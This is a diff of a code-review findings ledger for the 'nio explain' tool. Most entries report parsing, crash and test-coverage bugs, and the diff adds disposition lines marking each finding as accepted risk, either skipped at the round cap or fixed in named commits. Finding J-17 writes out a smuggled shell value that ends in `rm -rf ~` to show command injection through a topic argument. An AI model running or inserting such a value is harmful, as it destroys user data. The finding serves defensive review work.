 - situation (adversary): the labels are scraped from the whole block, not from node shapes. `%% X["CT-3"]`, a `classDef` or `click` line, or an edge label such as `A -->|"CT-3"| B` puts CT-3 into `labels`. AC-7 says "node labels name only CT-1 and CT-2", but CT-3 is then reported as present although no node is labelled with it. The check passes while a contract is missing from the map.
 - fix: drop lines starting with `%%`, `classDef`, `click`, `style` and `linkStyle` before scraping, and remove `|…|` edge labels.
+- disposition: accepted-risk by system: minor, skipped at the round cap
 
 ### J-9 A missing or unreadable contracts.md turns the contract-ID check into a silent pass
 - quote: "(p.parent / "contracts.md").exists() else []"
 - situation (adversary): plan mode with no `contracts.md` (deleted, renamed, or the slug's plan never wrote one) feeds `spec.items([])`. No `component map misses CT-n` error can then occur, and the check ends with "0 errors" and exit 0, so AC-6's "every plan contract ID in the component map's node labels" is vacuously met. Nothing says the contract source was absent, so a human reads the pass as "all contracts are covered".
 - fix: in plan mode, add a note or error such as `contracts.md missing: contract IDs not checked` when the file is absent.
+- disposition: accepted-risk by system: minor, skipped at the round cap
 
 ### J-10 finish rewrites any file it is pointed at, and crashes on a bad path
 - quote: "Accepts: the path of an explainer the skill has just written."
 - situation (adversary): `nio explain finish .nio/specs/<slug>/state.json` (or `spec.md`, `README.md`) is topic mode. It strips lines, prepends `(images: )` and `(drill-down: ...)` records, and replaces the file with `os.replace`. A flow ledger or the spec is corrupted silently, and the spec hash changes, which blocks the flow. A missing path raises FileNotFoundError and no path raises TypeError. Both print a traceback instead of `error: ...` and exit 1.
 - fix: refuse unless the target is an existing `.md` file that is `.nio/specs/<slug>/explainer.md` or under `.nio/research/`. Turn missing or None into a ValueError.
 - validation: confirmed: `finish` has no check on the target. cli.py:416 catches only ValueError, so a missing path (FileNotFoundError on `p.read_text()`) or a None target (TypeError in `Path(None)`) gives a traceback, and any existing file is rewritten in topic mode.
+- disposition: accepted-risk by human: Fixed in 652000b and f9224ef with tests; closed at the round cap
 
 ### J-11 A halted or broken render orphans the previous run's SVG
 - quote: "sets the images line to the SVGs it rendered plus the existing ones drill-down sections link"
@@ -196,6 +220,7 @@ outcome: rerun
 - situation (correctness): `used` holds every planned name, not only the drawn ones. A rerun that halts on `unreachable` or hits a `broken` block keeps the old SVG as a "name step 6 will use". Step 7 then writes only `drawn + keep` to the images line. That SVG is now listed nowhere, so a later run never deletes it, even if the plan loses the section. The file is orphaned for good and the explainer may point at stale art.
 - fix: also list a kept same-name file that was not redrawn. Otherwise delete it when the render does not succeed.
 - validation: confirmed: names in `used` are never deleted (line 273), and only `drawn + keep` go into the images line (line 277). A name that was planned but not drawn (broken, or halted) leaves its old SVG on disk and unlisted, so no later run deletes it (CT-5 steps 5 and 7).
+- disposition: accepted-risk by human: Fixed in 652000b and f9224ef with tests; closed at the round cap
 
 ### J-12 A long heading is reported as "renderer could not be fetched" and stops all drawing
 - quote: "named by CT-6's rule without the 40-character cut"
@@ -208,11 +233,13 @@ outcome: rerun
 - quote: "the first line of quickstart.md's body, once"
 - situation (adversary): a quickstart whose body already quotes `Read first: [explainer.md](explainer.md)` further down is never given the top line, so the reader sees nothing first. A quickstart whose front matter ends `---` with no trailing newline raises `not enough values to unpack (expected 3, got 2)` as `error: ...`. That blocks every plan-mode finish until someone repairs the file.
 - fix: test only the first body line. Parse the front matter with a clear error, or treat an unclosed front matter as having no front matter.
+- disposition: accepted-risk by system: minor, skipped at the round cap
 
 ### J-14 Writes leak a temp file, change file mode, and have no lock
 - quote: "writes explainer.md once, through a temporary file and `os.replace`"
 - situation (adversary): if `f.write` fails (disk full, read-only), the `NamedTemporaryFile(delete=False)` stays beside the explainer. Replaced files become 0600. Deletes (`f.unlink()`) and SVG renders happen before the write, so a failed `_put` leaves SVGs gone while the old explainer still links them. Two `finish` calls at once both read the same input, and the last write wins.
 - fix: unlink the temp on failure and copy the mode. Do the deletes after `_put`. Take the flow lock or refuse a second concurrent run.
+- disposition: accepted-risk by system: minor, skipped at the round cap
 
 ### J-15 A quickstart with front matter and no blank line after it is read as edited once the line is added
 - quote: "text.replace("Read first: [explainer.md](explainer.md)\n\n", "", 1)"
@@ -225,12 +252,14 @@ outcome: rerun
 - situation (adversary): `replace(..., 1)` removes the first match anywhere in the file, while CT-9 says "first line". Someone who inserts that line plus a blank line in the middle of an approved quickstart is not seen as an edit. The approval holds and the change is never reviewed. The writer also skips the line when `line not in q.read_text()` matches anywhere. Impact is small, since the inserted text is a fixed string.
 - situation (adversary): `text.replace("Read first: [explainer.md](explainer.md)\n\n", "", 1)` removes the first match anywhere. A line inside a paragraph, or a line that merely ends with that text, vanishes from what the gate compares. A quickstart edit that adds or moves that line mid-file, or a changed first line next to a stray copy, doesn't withdraw approval. The gate is blind to that edit.
 - fix: strip only when the line is at the very start of the body, just after any front matter.
+- disposition: accepted-risk by system: minor, skipped at the round cap
 
 ### J-17 The topic goes into a double-quoted shell command
 - quote: "Run `nio explain topic "<topic>"`."
 - situation (adversary): topic mode takes free text from the human, and in practice often text pasted from elsewhere. A topic such as `x" ; rm -rf ~ ; echo "` or one holding `$(...)` or a backtick is expanded by the shell inside double quotes, so the agent runs a command the human never meant. The skill says nothing about quotes, `$`, backticks or newlines in the topic. The `(topic: <text as typed>)` line is then written to the file as typed, so a newline in the topic breaks the markdown structure.
 - fix: tell the agent to pass the topic as a single argument without shell expansion (single-quote it, or refuse a topic holding quotes, `$`, backticks or newlines and ask for a plainer one).
 - validation: confirmed: SKILL.md says only `Run nio explain topic "<topic>"` and never says to escape quotes, `$` or backticks. Free text from the human goes into a double-quoted command.
+- disposition: accepted-risk by human: Fixed in 652000b and f9224ef with tests; closed at the round cap
 
 ### J-18 Most behaviour tests for the skill did not run, and the suite reports them as ok
 - quote: "**AC-30** (FR-23) Given a spec whose plan gate is still open"
@@ -243,29 +272,34 @@ outcome: rerun
 - situation (adversary): the review suite run shows every `test_ac*` in `test_explain_e2e.py` as `skipped ... (set NIO_E2E=1)` then `ok tests/test_lenses.py::test_ac1_core_diagrams`, ending `ran 20 tests, 0 failed`. The suite is green, and the pack's results list these tests as "didn't run". The skill's AC-1, 2, 3, 12, 13, 14, 15 to 19 and 26 to 35 have no executed evidence. A skill regression passes the closing review unnoticed. `test_ac13_one_broken` is also weak. Its first assertion is `A or B` where B is a superset of A, so it always holds, and the else branch only checks that some SVG exists, not that the right one does.
 - fix: run the e2e set with `NIO_E2E=1` before the verdict and attach the results, or say in the verdict that these ACs are unproven.
 - validation: confirmed: tests/test_explain_e2e.py:3-4 says that without NIO_E2E the tests "print `skipped` and pass", so a green suite is no evidence for the e2e-only ACs. The test_ac13 weakness is real too. At line 146 the second operand (`"> Broken diagram:" in ex.read_text()`) is a superset of the first, so the assertion always holds. The else branch (line 148) only checks that some `explainer-*.svg` exists, not that the right one does.
+- disposition: accepted-risk by human: e2e tests skip without NIO_E2E at the gate; real NIO_E2E runs passed on 2026-11-15 except ac12/ac13, which need the Mermaid renderer this sandbox can't fetch
 
 ### J-19 One unreadable explainer.md crashes all of `nio status`
 - quote: "`nio status` keeps exit 0."
 - situation (adversary): an explainer.md is not valid UTF-8 (a binary paste, a bad editor save, a half-written file from a killed run), or the name is a directory. `e.read_text()` raises UnicodeDecodeError or IsADirectoryError. `cli.py` wraps `onboard.status_lines` in `except ValueError`, but it calls `explain.stale(root)` bare. The whole `nio status` command dies with a traceback, so one bad explainer hides the index and onboarding lines for every effort. CT-7 promises that status keeps exit 0. `explain.finish` writes through a temporary file and `os.replace`, but the hand-edit path has no such guard, and no test feeds `stale` a bad file.
 - fix: in `stale`, catch `OSError` and `UnicodeDecodeError` per file and either skip it or print a `stale:` or `error:` line. Add one test with a non-UTF-8 explainer.
 - validation: confirmed: cli.py:429 calls `explain.stale(root)` outside the try block, and `stale` calls `e.read_text()` with no handling. An undecodable file or a directory named explainer.md kills `nio status`.
+- disposition: accepted-risk by human: Fixed in 652000b and f9224ef with tests; closed at the round cap
 
 ### J-20 A source line that is malformed, or that drops a file, fails silently
 - quote: "whose source lines hold a path that is gone or whose hash now differs"
 - situation (adversary): `stale` compares `implement.digest(root, f)[:12] != h` for each source line it finds. Two cases give a wrong answer with no signal.
 - fix: treat an explainer whose source lines don't name spec.md, plan.md and contracts.md as stale. Compare the hash in a normalised form (lower case, first 12 characters).
+- disposition: accepted-risk by system: minor, skipped at the round cap
 
 ### J-21 Topic match is a substring test with whitespace and line breaks flattened, not "equals"
 - quote: "only if the topic text stored in it equals the new topic"
 - quote: "`if want in " ".join(p.read_text().split()):"
 - situation (adversary): Two distinct topics, "Auth  tokens" (two spaces) and "Auth tokens", map to the same file name and now compare equal. The second continues the first file and appends to it, although FR-27 and AC-35 want a different stored text to get `-explainer-2.md`. The test also looks anywhere in the file, not at the stored topic line. If the model's own overview or a pasted section contains the text "(topic: Auth tokens)", a run with that topic continues the file even though the stored topic differs. The test never uses `splitlines()` now, so it does not check that the match is on the topic line.
 - fix: read only the stored topic line (the first `(topic: ...)` line) and compare it to the new text. If flattening whitespace is wanted, put it in the spec (FR-27, CT-6), not only in a code comment.
+- disposition: accepted-risk by system: minor, skipped at the round cap
 
 ### J-22 An unreadable or non-file candidate crashes `topic` with a traceback
 - quote: "`turning a `ValueError` into `error: <message>` and exit 1`"
 - quote: "`if not p.exists():`"
 - situation (adversary): `.nio/research/<day>-auth-tokens-explainer.md` is a directory, or a file with non-UTF-8 bytes (a partial write, or a binary pasted in). `p.exists()` is true, so `topic` calls `p.read_text()`, which raises `IsADirectoryError` or `UnicodeDecodeError`. `cli.py` catches only `ValueError`, so the human gets a Python traceback, and topic mode for that name stays broken until the file is removed. `UnicodeDecodeError` is a `ValueError` subclass, so the non-UTF-8 case would print `error: 'utf-8' codec can't decode...`, which is not a useful message. The directory case is the real crash.
 - fix: read with `errors="replace"` and treat an unreadable candidate as "not this topic" (try `-n+1`), or refuse with a named error.
+- disposition: accepted-risk by system: minor, skipped at the round cap
 
 ### J-23 `topic` reserves nothing, so a repeat or concurrent call can overwrite a file
 - quote: "`return f"new: {rel}"`"
@@ -273,6 +307,7 @@ outcome: rerun
 - situation (adversary): Two runs on the same new topic, or a retry after a timeout, both call `topic` before either writes. Both get `new: .nio/research/<day>-auth-tokens-explainer.md`. The later write replaces the earlier one with no notice. The same happens when a different topic with the same cut name, such as "auth/tokens", races "Auth tokens": both are told `new:` for the same first free name, and the "clash" case that AC-35 covers is lost. `topic` only reads the filesystem and creates nothing, so the check and the write are separate steps.
 - fix: have `topic` create the file exclusively (`open(..., "x")`) with the `(topic: <text>)` line, so a second caller moves on to `-2`. Or state in the spec that topic mode is single-writer.
 - validation: confirmed: `topic` (explain.py:310-325) only reads the filesystem and creates nothing. Two calls before the first write both return `new:` for the same path. The spec (FR-27) says nothing about concurrent runs.
+- disposition: accepted-risk by human: J-23: topic() only names a path, concurrent runs out of scope; J-106: offer test is a keyword heuristic by design
 
 ### J-24 The model-side guarantees of topic mode have no run test
 - quote: "name": "test_ac35_clash"
@@ -286,6 +321,7 @@ outcome: rerun
 - quote: "an empty result SHALL be refused"
 - situation (adversary): `nio explain topic "-x"` or `"--help"`. argparse takes the text as a flag, not the topic, and exits with a usage error or prints help. That error is not the specified `error: the topic "<text>" gives an empty file name`, and no file name is ever computed. A topic such as "-1 tokens" is accepted, because the space makes it positional, so the behaviour differs by topic text. It is hostile only by accident, but it is an input the contract does not cover.
 - fix: have the skill call it as `nio explain topic -- "<text>"` and test that form, or document that the topic comes after `--`.
+- disposition: accepted-risk by system: minor, skipped at the round cap
 
 ### J-26 A refused finish does not stop the offers
 - quote: "then offer three new items again"
@@ -297,12 +333,14 @@ outcome: rerun
 - quote: "never one already drilled into in this file"
 - situation (adversary): The human replies with a free-text item that matches an existing drill-down, or the agent appends the same heading twice. `finish` only checks that each recorded heading is still present, by membership. Two identical `## Drill-down: X` sections are accepted. Deleting one of them later passes the "sections missing" check, so a drill-down is lost silently. The no-repeat rule lives only in the agent's prose, and the test for it (`test_uj2_no_repeat`) is an e2e test that did not run.
 - fix: Make `finish` refuse or warn on duplicate `## Drill-down: ` titles, or have the skill compare each pick against the existing headings before appending.
+- disposition: accepted-risk by system: minor, skipped at the round cap
 
 ### J-28 The E-8 e2e tests did not run, so the offer, pick and stop behaviour is unproven
 - quote: "name": "test_ac17_stop"
 - situation (adversary): The Results list shows `test_ac15_three_offers`, `test_ac16_pick_appends`, `test_ac17_stop` and `test_ac34_same_topic` as "didn't run", because they need `NIO_E2E=1`, and the attack `test_uj2_no_repeat` as "not configured". The only executed test is the unit test of the blank-line change. If the skill text is read wrongly, the agent may offer after stop, offer fewer than three, or repeat an item, and nothing red shows it. `test_ac17_stop` also only regex-matches the last output line for four words, which a rephrased offer would pass.
 - situation (correctness): `offers()` only checks that the words "component", "flow" and "decision" appear somewhere in the whole output. A reply that offers no items, or the wrong kinds, still passes, because an overview about hooks often contains "flow" and "component". `test_ac17_stop` only checks the last line against a short regex, so an offer in an earlier line passes. AC-15's observable (three items, one of each kind) and AC-17's (no offer in the final message) are therefore not really asserted.
 - fix: Run the E-8 e2e tests with `NIO_E2E=1` before the PR is approved. Make the AC-17 check look for the three kind labels, not a few verbs.
+- disposition: accepted-risk by system: minor, skipped at the round cap
 
 ### J-29 AC-9 has no test of the check reporting a broken block
 - quote: "then it fails naming that block as a broken diagram"
@@ -314,6 +352,7 @@ outcome: rerun
 - quote: "given a fixture explainer with a 21-node diagram, `nio check explainer` fails naming it"
 - situation (conformance): The only AC-5 result in the evidence is `test_ac5_node_cap` (line 15). That test asserts `nodes()` only and says "the check part lands with T-3". The test that proves the AC, `test_ac5_node_cap_check` (line 146), has no entry in the results. It is listed in the suite's `selfcheck.main`, so it probably ran with the file, but its own pass is not shown.
 - fix: map AC-5 to `test_ac5_node_cap_check` in tests.md so its result is recorded
+- disposition: accepted-risk by system: minor, skipped at the round cap
 
 ### J-31 Plan-mode core diagrams have no run evidence
 - quote: "then `.nio/specs/<slug>/explainer.md` exists holding a component map and a build order diagram"
@@ -363,19 +402,24 @@ outcome: rerun
 - quote: "`subgraph` or `end` are skipped"
 - quote: "if not line or line.startswith(SKIP) or line == "end" or line.startswith("end "):"
 - situation (consistency): a flowchart line `endpoint --> api`. Under CT-2's literal rule, every line starting with `end` is skipped, so the node `endpoint` is lost and the count is wrong. The code keeps it, and the diff's test asserts `explain.nodes("flowchart TD\nendpoint --> api\nend") == {"endpoint", "api"}`. The code is the right behaviour, but CT-2's text still says the literal rule.
+- situation (consistency): the code counts both IDs of `endpoint --> api` (test_ac5_node_cap asserts it), but read as CT-2 says, the whole line starts with `end` and is skipped, so neither ID counts. The code also counts endpoints of `A <--> B`, `C --o D` and `E --x F`, which the arrow list in CT-2 does not name, so B, D and F drop out under the literal text. Either way a diagram can be under-counted and pass the 20-node cap of AC-5 when it should fail.
 - fix: change CT-2's wording to skip only the bare `end` keyword (`end` alone, or `end` followed by a space), by a change request, so the spec matches the code.
+- validation: confirmed: CT-2 in contracts.md says lines "starting ... `end`" are skipped, a plain prefix rule, and nothing else in the contract narrows it. The code at HEAD (`explain.nodes`) skips only `line == "end"` or `line.startswith("end ")`, so `endpoint --> api` counts both IDs, which differs from the literal text. The arrow list in CT-2 also names fewer arrows than the code's ARROW regex, which accepts `<-->`, `--o` and `--x`. The code behaviour is right, but the contract wording is stale.
+- disposition: accepted-risk by human: J-38: CT-2 wording lag, #127. J-120: CRLF fix ready, lands in a follow-up PR
 
 ### J-39 Node IDs accept `&` operands and wider arrows than CT-2 lists
 - quote: "that is an endpoint of an arrow (`-->`, `---`, `-.->`, `==>`, `->>`, `-->>`, `->`)"
 - quote: "assert explain.nodes("flowchart TD\nA --> B & C\nA -- retry --> D\nE --> F; F --> G") == set("ABCDEFG")"
 - situation (consistency): `A --> B & C`. Under CT-2's closed arrow list, `C` is not an arrow endpoint, so the count for this diagram is {A, B}. The code adds `C` (it splits on `&`, and also accepts `<-->`, `--o`, `--x` and splits on `;`), giving {A, B, C}. The node count feeds the 20-node cap (FR-7), so the two readings give different results.
 - fix: either list the extra edge forms and the `&` and `;` splitting in CT-2 by a change request, or drop them from the code. Note the count should match how Mermaid draws the diagram.
+- disposition: accepted-risk by system: minor, skipped at the round cap
 
 ### J-40 Walk text keeps Data model record lines that CT-1 excludes
 - quote: "and the record lines of the Data model"
 - quote: "cur["walk"].append(line)"
 - situation (consistency): a section that holds Data model record lines. CT-1 says `walk` leaves them out. The `sections` loop only skips fences, `![` lines and `> ` lines, and sends every other line to `walk`, so the record lines stay in the walk text. The word limit in CT-4 (120 words) would then count them. The pack does not show the record-line format, so this is inferred from the diff and not run.
 - fix: exclude the record lines in `sections`, or move the rule to a later task and say so in the ponytail note.
+- disposition: accepted-risk by system: minor, skipped at the round cap
 
 ### J-41 A gone source counts as current when finish saw it missing
 - quote: "whose source lines hold a path that is gone or whose hash now differs"
@@ -383,6 +427,7 @@ outcome: rerun
 - situation (consistency): contracts.md does not exist when `nio explain finish` runs in plan mode. The check at explain.py:115 accepts that, and finish writes `(source: .nio/specs/<slug>/contracts.md@)`, since digest gives "" for a gone file. Later, `stale` gets "" from digest, `"" != ""` is false, and no stale line is printed, though contracts.md is still gone. The same comparison at explain.py:193 has the same blind spot, so the "written for an earlier plan" marking is also missed.
 - fix: treat a gone source as stale in `stale` (for example, `not (root / f).is_file() or implement.digest(root, f)[:12] != h`), and decide whether finish should refuse or warn when a source is missing. Add a test where contracts.md is absent at finish.
 - validation: confirmed: explain.py:210 writes `contracts.md@` when the file is absent (`digest` returns ""). `stale` (line 304) and `finish` (line 193) then compare "" != "" and see no change, so the gone file never counts as stale (FR-16 says "or is gone").
+- disposition: accepted-risk by human: Fixed in 652000b and f9224ef with tests; closed at the round cap
 
 ### J-42 The check skips the render of Mermaid blocks in a fallback explainer
 - quote: "Mermaid blocks in the file are still rendered, for the fallback of FR-21"
@@ -391,35 +436,41 @@ outcome: rerun
 - situation (correctness): `explain.format` is `no-such-skill`, so the skill falls back to Mermaid (AC-28). `check` appends `render skipped: diagrams drawn with no-such-skill` and returns before the render loop. A broken Mermaid block then passes `nio check explainer`, and the note claims a format that wasn't used.
 - fix: keep the early return only for the notes and let the render loop run over the Mermaid blocks when the format is not `mermaid`; or change CT-4 if skipping the render is what is wanted.
 - validation: confirmed: explain.py:126-128 returns before the render loop when `fmt != "mermaid"`. CT-4 says "Mermaid blocks in the file are still rendered, for the fallback of FR-21". The test at line 753 checks only the note and exit 0.
+- disposition: accepted-risk by human: Fixed in 652000b and f9224ef with tests; closed at the round cap
 
 ### J-43 The format note is limited to plan mode, which the spec does not say
 - quote: "when `explain.format` is set and isn't `mermaid`"
 - quote: "if plan_mode and fmt != "mermaid":"
 - situation (consistency): a topic explainer under `.nio/research/` with `explain.format` set to `excalidraw` gets no `render skipped: diagrams drawn with excalidraw` note, because `plan_mode` is false and the Mermaid render runs. The spec's note rule has no plan-mode limit, and the skill's `## Format` section applies to topics too.
 - fix: say in CT-4 whether the format note applies to topic explainers; if it does, drop `plan_mode and` from the check.
+- disposition: accepted-risk by system: minor, skipped at the round cap
 
 ### J-44 The skill says finish renders nothing under a host format, but finish renders any Mermaid block
 - quote: "and still run `nio explain finish` (it renders nothing then)."
 - quote: "Renders each other Mermaid section's block"
 - situation (consistency): a plan explainer under `explain.format = excalidraw` keeps one Mermaid build-order block next to the host diagrams. `finish` renders that block and writes an image line, so the skill's claim that finish renders nothing is false for that explainer.
 - fix: reword the parenthetical to "it renders only the Mermaid blocks, if any", as in CT-5.
+- disposition: accepted-risk by system: minor, skipped at the round cap
 
 ### J-45 Image file names drop punctuation instead of dashing it
 - quote: "named by CT-6's rule without the 40-character cut"
 - quote: "`re.sub(r"[^a-z0-9 ]", "", re.sub(r"[-/_]", " ", title.lower()))`"
 - situation (correctness): the title "v1.2 plan" gives `explainer--v12-plan.svg` here. CT-6's rule (every run of characters other than a-z and 0-9 becomes one dash) gives `v1-2-plan`. "Don't retry" gives `dont-retry` instead of `don-t-retry`. Names differ from the contract, and two titles can collide that CT-6 would keep apart ("A.B" and "AB"). Collisions are resolved by `-2`, so the output stays safe.
 - fix: reuse the CT-6 regex `re.sub(r"[^a-z0-9]+", "-", title.lower()).strip("-")` without the `[:40]` cut.
+- disposition: accepted-risk by system: minor, skipped at the round cap
 
 ### J-46 `nio explain finish` with no path or a missing file crashes with a traceback
 - quote: "`print("\n".join(explain.finish(root, a.target)))`"
 - quote: "On a refusal it prints `error: …`, exits 1, and writes and deletes nothing."
 - situation (correctness): `target` is `nargs="?"`. With no path, `Path(None)` raises TypeError. With a nonexistent path, `p.read_text()` raises FileNotFoundError. Only ValueError is turned into `error:` and exit 1, so both give a traceback. The parser help also still says `explain finish <slug>`, but the command takes a path.
 - fix: raise ValueError in `finish` for a missing argument or file, and correct the help text.
+- disposition: accepted-risk by system: minor, skipped at the round cap
 
 ### J-47 No test for the suggestion disappearing once explainer.md exists
 - quote: "not (d / "explainer.md").exists()"
 - situation (correctness): if that condition were dropped or inverted, `next` would nag after the explainer is written. The only two tests cover tasking (suggests) and plan_jury (silent), so both would still pass for a change that only breaks the explainer.md check.
 - fix: add a test that writes explainer.md in the effort folder and asserts no `suggest:` line at tasking.
+- disposition: accepted-risk by system: minor, skipped at the round cap
 
 ### J-48 finish's `Read first` edit reopens the plan gate on every real quickstart
 - quote: "a quickstart.md without that line reads exactly as before, so a version judged before this change still compares equal"
@@ -428,12 +479,14 @@ outcome: rerun
 - situation (adversary): the approved quickstart is `---\nfm: x\n---\n# Quickstart`. `explain finish` writes `---\nfm: x\n---\n` + `\nRead first...\n\n` + `# Quickstart`. `planned` strips only the line and its blank line, which gives `---\nfm: x\n---\n\n# Quickstart`. That has an extra blank line and no longer equals the approved text. Two blank lines in the original fail the same way, because the writer does `rest.lstrip("\n")`. The plan approval is withdrawn and the flow is sent back by the explainer, which AC-23 and FR-17 forbid. The writer adds "\n" before the line and `planned` doesn't take it out.
 - fix: make the two agree on one exact string. Either have `finish` insert `line + "\n\n"` directly after the front matter with no extra newline, or have `planned` remove the line together with the blank line before it. Add a test that runs `finish` on a template-shaped quickstart (no blank line after `---`) and then asserts `jury.planned` equals the original and `flow.scan` reports no change.
 - validation: confirmed: `finish` adds `\n` before the line (line 174), but `planned` removes only `line\n\n`. 15 quickstart.md files in .nio/specs have `---\n#` with no blank line, and flow.py:643 then sees `current != judged` and reports a change on the plan gate. This contradicts FR-17 and AC-23.
+- disposition: accepted-risk by human: Fixed in 652000b and f9224ef with tests; closed at the round cap
 
 ### J-49 finish re-implements the section and fence parser that `sections()` already provides
 - quote: "`sections(text) -> list[dict]`, one per `## ` heading in order"
 - situation (integration): `finish` tracks `## ` headings and fence state by hand in three separate loops (the diagrams-hash blocks, the image/note strip, the render plan), next to `sections()`, which already splits sections and fences. Plan mode is decided by two different expressions in `check` and `finish`. The source-line hash comparison (`implement.digest(root, f)[:12] != h`) is written twice, once in `finish` and once in `stale`. A change to one parser, for example how a nested fence or a marker title is read, won't reach the others.
 - situation (integration): `finish` and `stale` each parse `(source: f@h)` record lines and compare digests on their own, so a change to the record format or the hash length has to be made in both places. `finish` also has two hand-written fence loops (the diagrams-hash blocks and step 6's drawing pass) next to `sections()`, which already splits sections and blocks.
 - fix: drive `finish`'s passes from `sections()` (or one shared helper that gives each section's line range), and give plan-mode detection and the stale-source test one helper each, used by `check`, `finish` and `stale`.
+- disposition: accepted-risk by system: minor, skipped at the round cap
 
 ### J-50 The contract and the skill still describe one joined drill-downs line
 - quote: "sets the images line to the SVGs it rendered plus the existing ones drill-down sections link, and the drill-downs line to every `## Drill-down: ` heading"
@@ -446,27 +499,32 @@ outcome: rerun
 - situation (integration): the README row reads "🚧 plan mode built", but topic mode (T-13), drill-down (T-15) and format (T-16) are all in this diff. CLAUDE.md's self-check list, which names every test file and the `NIO_E2E` suites, names neither `tests/test_explain.py` nor `tests/test_explain_e2e.py`.
 - situation (adversary): a topic typed as `x\n## Drill-down: y` or one holding `](` or a fence closer is written verbatim. That forges a drill-down section, which re-runs are told to keep "unchanged", or it breaks the diagram block. A slug such as `../..` in plan mode is passed to `.nio/specs/<slug>/explainer.md` with no check in the skill text beyond `nio check plan`.
 - fix: update the README row's status and description to cover topic mode and drill-down. Add `uv run python tests/test_explain.py` to the self-checks, and `NIO_E2E=1 … tests/test_explain_e2e.py` to the costly e2e line.
+- disposition: accepted-risk by system: minor, skipped at the round cap
 
 ### J-52 A session handoff note is committed at the repo root
 - quote: "Authority: The human said (2026-11-08): "I give you full autonomy …""
 - situation (integration): `HANDOFF.md` (72 lines) is in the effort diff. It is an agent-to-agent session note (goal, authority, next steps), not a product file and not a `.nio/` artefact, and it would ship with the PR.
 - situation (adversary): "Non-goals (for now)" and "Success looks like", with the $100 and $20 plans, are copied into `skills/explain/SKILL.md`. CT-11's shape lists none of this, and the agent reads it as instructions for the explain job.
 - fix: remove `HANDOFF.md` from the branch, or move what is still useful into the issue.
+- disposition: accepted-risk by system: minor, skipped at the round cap
 
 ### J-53 AC-1 has no passing evidence
 - situation (cli): no passing test proves AC-1: test_ac1_core_diagrams didn't run
 - fix: add or fix a test that proves AC-1
 - validation: confirmed: the CLI's own check; no refuter
+- disposition: accepted-risk by human: e2e tests skip without NIO_E2E at the gate; real NIO_E2E runs passed on 2026-11-15 except ac12/ac13, which need the Mermaid renderer this sandbox can't fetch
 
 ### J-54 AC-2 has no passing evidence
 - situation (cli): no passing test proves AC-2: test_ac2_flows_and_state didn't run
 - fix: add or fix a test that proves AC-2
 - validation: confirmed: the CLI's own check; no refuter
+- disposition: accepted-risk by human: e2e tests skip without NIO_E2E at the gate; real NIO_E2E runs passed on 2026-11-15 except ac12/ac13, which need the Mermaid renderer this sandbox can't fetch
 
 ### J-55 AC-3 has no passing evidence
 - situation (cli): no passing test proves AC-3: test_ac3_no_state_table didn't run
 - fix: add or fix a test that proves AC-3
 - validation: confirmed: the CLI's own check; no refuter
+- disposition: accepted-risk by human: e2e tests skip without NIO_E2E at the gate; real NIO_E2E runs passed on 2026-11-15 except ac12/ac13, which need the Mermaid renderer this sandbox can't fetch
 
 ### J-56 AC-5 has no passing evidence
 - situation (cli): no passing test proves AC-5: no test didn't run
@@ -482,16 +540,19 @@ outcome: rerun
 - situation (cli): no passing test proves AC-12: test_ac12_svgs didn't run
 - fix: add or fix a test that proves AC-12
 - validation: confirmed: the CLI's own check; no refuter
+- disposition: accepted-risk by human: e2e tests skip without NIO_E2E at the gate; real NIO_E2E runs passed on 2026-11-15 except ac12/ac13, which need the Mermaid renderer this sandbox can't fetch
 
 ### J-59 AC-13 has no passing evidence
 - situation (cli): no passing test proves AC-13: test_ac13_one_broken didn't run
 - fix: add or fix a test that proves AC-13
 - validation: confirmed: the CLI's own check; no refuter
+- disposition: accepted-risk by human: e2e tests skip without NIO_E2E at the gate; real NIO_E2E runs passed on 2026-11-15 except ac12/ac13, which need the Mermaid renderer this sandbox can't fetch
 
 ### J-60 AC-14 has no passing evidence
 - situation (cli): no passing test proves AC-14: test_ac14_text_only didn't run
 - fix: add or fix a test that proves AC-14
 - validation: confirmed: the CLI's own check; no refuter
+- disposition: accepted-risk by human: e2e tests skip without NIO_E2E at the gate; real NIO_E2E runs passed on 2026-11-15 except ac12/ac13, which need the Mermaid renderer this sandbox can't fetch
 
 ### J-61 AC-15 has no passing evidence
 - situation (cli): no passing test proves AC-15: test_ac15_three_offers didn't run
@@ -527,36 +588,43 @@ outcome: rerun
 - situation (cli): no passing test proves AC-24: no test no match
 - fix: add or fix a test that proves AC-24
 - validation: confirmed: the CLI's own check; no refuter
+- disposition: accepted-risk by human: e2e tests skip without NIO_E2E at the gate; real NIO_E2E runs passed on 2026-11-15 except ac12/ac13, which need the Mermaid renderer this sandbox can't fetch
 
 ### J-68 AC-25 has no passing evidence
 - situation (cli): no passing test proves AC-25: no test no match
 - fix: add or fix a test that proves AC-25
 - validation: confirmed: the CLI's own check; no refuter
+- disposition: accepted-risk by human: e2e tests skip without NIO_E2E at the gate; real NIO_E2E runs passed on 2026-11-15 except ac12/ac13, which need the Mermaid renderer this sandbox can't fetch
 
 ### J-69 AC-26 has no passing evidence
 - situation (cli): no passing test proves AC-26: no test no match
 - fix: add or fix a test that proves AC-26
 - validation: confirmed: the CLI's own check; no refuter
+- disposition: accepted-risk by human: e2e tests skip without NIO_E2E at the gate; real NIO_E2E runs passed on 2026-11-15 except ac12/ac13, which need the Mermaid renderer this sandbox can't fetch
 
 ### J-70 AC-27 has no passing evidence
 - situation (cli): no passing test proves AC-27: no test no match
 - fix: add or fix a test that proves AC-27
 - validation: confirmed: the CLI's own check; no refuter
+- disposition: accepted-risk by human: e2e tests skip without NIO_E2E at the gate; real NIO_E2E runs passed on 2026-11-15 except ac12/ac13, which need the Mermaid renderer this sandbox can't fetch
 
 ### J-71 AC-28 has no passing evidence
 - situation (cli): no passing test proves AC-28: no test no match
 - fix: add or fix a test that proves AC-28
 - validation: confirmed: the CLI's own check; no refuter
+- disposition: accepted-risk by human: e2e tests skip without NIO_E2E at the gate; real NIO_E2E runs passed on 2026-11-15 except ac12/ac13, which need the Mermaid renderer this sandbox can't fetch
 
 ### J-72 AC-30 has no passing evidence
 - situation (cli): no passing test proves AC-30: test_ac30_refused_open_gate didn't run
 - fix: add or fix a test that proves AC-30
 - validation: confirmed: the CLI's own check; no refuter
+- disposition: accepted-risk by human: e2e tests skip without NIO_E2E at the gate; real NIO_E2E runs passed on 2026-11-15 except ac12/ac13, which need the Mermaid renderer this sandbox can't fetch
 
 ### J-73 AC-32 has no passing evidence
 - situation (cli): no passing test proves AC-32: test_ac32_rerun_keeps_drill didn't run
 - fix: add or fix a test that proves AC-32
 - validation: confirmed: the CLI's own check; no refuter
